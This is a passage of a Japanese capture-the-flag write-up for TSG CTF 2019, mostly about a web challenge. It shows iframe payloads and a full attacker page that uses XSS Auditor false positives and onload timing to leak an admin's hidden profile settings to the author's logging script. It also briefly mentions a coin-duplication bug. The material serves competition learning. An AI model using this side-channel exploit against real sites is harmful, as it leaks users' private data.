class=hljs-variable>$u2</span> . PHP_EOL);\n<span class=hljs-meta>?></span>\n</code></pre><p>この文字列のどちらかを使って登録した上で、もう一方の文字列を宛先として指定して送金すると、コインが増殖します。 curlを使うと容易です。<h1>RECON (500pts)</h1><p>Web問です。PHPで実装された、プロフィールを登録できるサービスです。 秘密の質問として20種類のフルーツが好きか否かを選択できるようになっていて、どうやらadminの好きなフルーツをRECONすれば良いみたいです。<p>ソースコードを見ると、自身のプロフィールを確認するページで露骨にCSPが弱められていて、怪しさがあります。<pre><code class=\"hljs language-php\"><span class=hljs-variable>$response</span>->withHeader(<span class=hljs-string>\"Content-Security-Policy\"</span>, <span class=hljs-string>\"script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self'\"</span>)\n</code></pre><p>この要素は新しい機能なので、<code>script-src-elem</code>と<code>script-src-attr</code>が効いていなくて、実質XSSし放題になっているようでした。 しかしながら、このページはログインしたユーザ自身のプロフィールを表示するものですので、狙った相手にコードを実行させるのは厳しそうな雰囲気があります。<p>ところで、そもそも何故<code>script-src-attr</code>などという特殊な(?)制限が付されているのでしょうか？ この答えは、このページのソースを注意深く見るとすぐに気が付きました。<pre><code class=\"hljs language-html\">🍇 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"grapes\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"grapes.checked=false;\"</span> ></span>\n🍈 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"melon\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"melon.checked=false;\"</span> ></span>\n🍉 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"watermelon\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"watermelon.checked=false;\"</span> ></span>\n🍊 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"tangerine\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"tangerine.checked=false;\"</span> ></span>\n🍋 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"lemon\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"lemon.checked=false;\"</span> ></span>\n🍌 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"banana\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"banana.checked=false;\"</span> ></span>\n🍍 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"pineapple\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"pineapple.checked=false;\"</span> ></span>\n🍐 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"pear\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"pear.checked=false;\"</span> ></span>\n🍑 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"peach\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"peach.checked=false;\"</span> ></span>\n🍒 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"cherries\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"cherries.checked=false;\"</span> ></span>\n🍓 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"strawberry\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"strawberry.checked=false;\"</span> ></span>\n🍅 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"tomato\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"tomato.checked=false;\"</span> ></span>\n🥥 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"coconut\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"coconut.checked=false;\"</span> ></span>\n🥭 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"mango\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"mango.checked=false;\"</span> ></span>\n🥑 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"avocado\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"avocado.checked=false;\"</span> ></span>\n🍆 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"aubergine\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"aubergine.checked=false;\"</span> ></span>\n🥔 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"potato\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"potato.checked=false;\"</span> ></span>\n🥕 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"carrot\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"carrot.checked=false;\"</span> ></span>\n🥦 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"broccoli\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"broccoli.checked=false;\"</span> ></span>\n🍄 <span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>\"checkbox\"</span> <span class=hljs-attr>id</span>=<span class=hljs-string>\"mushroom\"</span> <span class=hljs-attr>onchange</span>=<span class=hljs-string>\"mushroom.checked=false;\"</span> ></span>\n</code></pre><p>秘密の質問がプロフィールページに表示されているんですが、この変更を禁止する目的でJavaScriptが用いられているのでした！ このコードのみ実行できるようにする目的で、部分的なunsafe-inlineが許容されていたようです。<p>もし、この小さなJavaScriptコードを盗むことができれば、adminの好きなフルーツを知ることできそうです。 このページでは、<code>X-XSS-Protection: 1; mode=block</code>というヘッダが送信されていて、XSS Auditorがブロックモードで動作することが期待されていて、adminのブラウザもこれに従っているでしょう。 こういう場合に、XSS Auditorの誤検出を利用して、ページ内のスクリプトを盗む手法が存在します。<aside><a href=https://www.mbsd.jp/blog/20160407_2.html rel=\"noopener noreferrer\"target=_blank style=background-image:url(https://www.mbsd.jp/img/logo.gif)><div><strong>ブラウザのXSSフィルタを利用した情報窃取攻撃 | MBSD Blog</strong><cite>www.mbsd.jp</cite><q cite=https://www.mbsd.jp/blog/20160407_2.html>MBSD’s cyber-experts discuss the latest or a new interpretation of cyber security trends.</q></div></a></aside><p>これを利用できそうです。（できました。） 以下のような2つのIFRAMEを表示させれば、どちらか一方をXSS Auditorがブロックするはずです。<pre><code class=\"hljs language-html\"><span class=hljs-tag>&lt;<span class=hljs-name>iframe</span> <span class=hljs-attr>src</span>=<span class=hljs-string>'http://34.97.74.235:10033/profile?onchange=\"melon.checked=true;\"'</span>></span><span class=hljs-tag>&#60/<span class=hljs-name>iframe</span>></span>\n<span class=hljs-tag>&lt;<span class=hljs-name>iframe</span> <span class=hljs-attr>src</span>=<span class=hljs-string>'http://34.97.74.235:10033/profile?onchange=\"melon.checked=false;\"'</span>></span><span class=hljs-tag>&#60/<span class=hljs-name>iframe</span>></span>\n</code></pre><p>この性質を利用し、攻撃者のページで2つのIFRAMEを開かせて、どちらがブロックされたかを判別すれば良いですね。 IFRAME要素の<code>contentWindow.length</code>を見ると、XSS Auditorが作動したか否かを簡単に判別できるようでしたが、手元で試したときに何故かうまくいかなかったので（これは勘違いだったかもしれませんが）、<code>onload</code>が発火するまでの時間を計測するちょっと面倒な方法で判別しています。 XSS Auditorが作動すると、関連リソースの読み込みが走らないので、<code>onload</code>が早く呼ばれるはずです。<p>以下のように実装し、IFRAMEをプロフィールに埋め込んで、adminにアクセスさせました。 JavaScriptの記法モダンだったりレガシーだったりしていて、気持ち悪いんですが、終了ギリギリで解いていたためいろいろ焦っていて、見当違いの試行錯誤をしていた名残です。<pre><code class=\"hljs language-php\"><span class=hljs-meta>&#60?php</span>\n\t<span class=hljs-keyword>if</span>(array_key_exists(<span class=hljs-string>\"save\"</span>, <span class=hljs-variable>$_GET</span>)){\n\t\tfile_put_contents(<span class=hljs-string>\"save.txt\"</span>, <span class=hljs-variable>$_GET</span>[<span class=hljs-string>\"save\"</span>] . PHP_EOL, FILE_APPEND | LOCK_EX);\n\t\t<span class=hljs-keyword>echo</span>(<span class=hljs-string>\"OK!\"</span>);\n\t}<span class=hljs-keyword>else</span>{\n<span class=hljs-meta>?></span>\n&#60html>\n&#60body>\n&#60script>\n\n<span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>test</span>(<span class=hljs-params>key, val</span>)</span>{\n\t<span class=hljs-keyword>return</span> <span class=hljs-keyword>new</span> Promise(<span class=hljs-function><span class=hljs-keyword>function</span>(<span class=hljs-params>resolve</span>)</span>{\n\t\t<span class=hljs-keyword>const</span> iframe = document.createElement(<span class=hljs-string>\"iframe\"</span>);\n\t\tiframe.onload = <span class=hljs-function><span class=hljs-keyword>function</span>(<span class=hljs-params></span>)</span>{\n\t\t\tiframe.remove();\n\t\t\tresolve([key, val, <span class=hljs-keyword>new</span> Date().getTime() - time]);\n\t\t};\n\t\tiframe.src = `http:<span class=hljs-comment>//34.97.74.235:10033/profile?onchange=\"${key}.checked=${val};\"`;</span>\n\t\t<span class=hljs-keyword>const</span> time = <span class=hljs-keyword>new</span> Date().getTime();\n\t\tdocument.body.appendChild(iframe);\n\t});\n}\n\n(async () => {\n\t<span class=hljs-keyword>const</span> results = [];\n\t<span class=hljs-keyword>for</span>(let i = <span class=hljs-number>0</span>; i &#60 <span class=hljs-number>1</span>; i++){\n\t\tresults.push([\n\t\t\tawait test(<span class=hljs-string>\"mushroom\"</span>, <span class=hljs-literal>true</span>),\n\t\t\tawait test(<span class=hljs-string>\"mushroom\"</span>, <span class=hljs-literal>false</span>),\n\t\t]);\n\t}\n\tlocation.href = <span class=hljs-string>\"?save=\"</span> + results;\n})();\n&#60/script>\n&#60/body>\n&#60/html>\n<span class=hljs-meta>&#60?php</span>\n\t}\n<span class=hljs-meta>?></span>\n</code></pre><p>これを用いて、フルーツ1種類ごとに計測した結果が以下のとおりです。 Captchaを連打する必要があって、激ツラかったです。チームメイトにひたすらCaptchaしてもらいました。（もっと頭の良い実装をすればよかった気もしますが。）<table><thead><tr><th>フルーツ<th>trueのonload(ms)<th>falseのonload(ms)<th>判定結果<tbody><tr><td>grapes<td>84<td>334<td>TRUE<tr><td>melon<td>347<td>65<td>FALSE<tr><td>watermelon<td>245<td>47<td>FALSE<tr><td>tangerine<td>78<td>394<td>TRUE<tr><td>lemon<td>83<td>418<td>TRUE<tr><td>banana<td>73<td>255<td>TRUE<tr><td>pineapple<td>79<td>452<td>TRUE<tr><td>pear<td>252<td>48<td>FALSE<tr><td>peach<td>74<td>281<td>TRUE<tr><td>cherries<td>76<td>336<td>TRUE<tr><td>strawberry<td>79<td>318<td>TRUE<tr><td>tomato<td>77<td>353<td>TRUE<tr><td>coconut<td>77<td>333<td>TRUE<tr><td>mango<td>92<td>404<td>TRUE<tr><td>avocado<td>254<td>47<td>FALSE<tr><td>aubergine<td>85<td>333<td>TRUE<tr><td>potato<td>249<td>46<td>FALSE<tr><td>carrot<td>72<td>321<td>TRUE<tr><td>broccoli<td>428<td>40<td>FALSE<tr><td>mushroom<td>87<td>388<td>TRUE</table><p>あとは、この結果を用いてadminのrecoveryメッセージ（FLAG）を表示させることができました。<h1>総括</h1><p>Web問しか触っていないので他のジャンルはわかりかねますが、良い問題でした。<ul><li>誘導が適切で、guessが最小限で済んだ<li>扱っているテーマも面白いものだった</ul><p>おわりです。 なんか💰を貰えるらしいので、焼肉にでも行きたいです🐦<blockquote class=twitter-tweet><p dir=ltr lang=ja>事前のお知らせのとり、上位3チームに賞金が与えられます。 TokyoWesterns, hxp, NaruseJun のみなさん、おめでとうございます！<a href=https://t.co/bu6r4T50ZR>https://t.co/bu6r4T50ZR</a> <a href=\"https://twitter.com/hashtag/tsg_ctf?src=hash&#38ref_src=twsrc%5Etfw\">#tsg_ctf</a></p>— TSG CTF International (@tsgctf) <a href=\"https://twitter.com/tsgctf/status/1124933926202560512?ref_src=twsrc%5Etfw\">May 5, 2019</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script>"},"__N_SSG":true}